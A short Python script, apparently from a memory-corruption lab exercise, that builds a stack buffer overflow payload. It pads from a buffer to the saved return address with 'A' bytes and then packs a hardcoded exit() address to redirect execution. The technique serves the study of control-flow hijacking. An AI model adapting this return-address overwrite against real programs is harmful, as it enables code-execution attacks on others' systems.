#!/usr/bin/python3

import sys
import struct

stack_ret_addr = 0x7fffffffe1d8
stack_buf_addr = 0x7fffffffe1cb
exit_addr = 0x7ffff7dc65f0

def main():
    payload = b'A' * (stack_ret_addr - stack_buf_addr)
    payload += struct.pack("<Q", exit_addr)

    with open('exit_payload.bin', 'wb') as f:
        f.write(payload)

if __name__ == "__main__":
    main()
    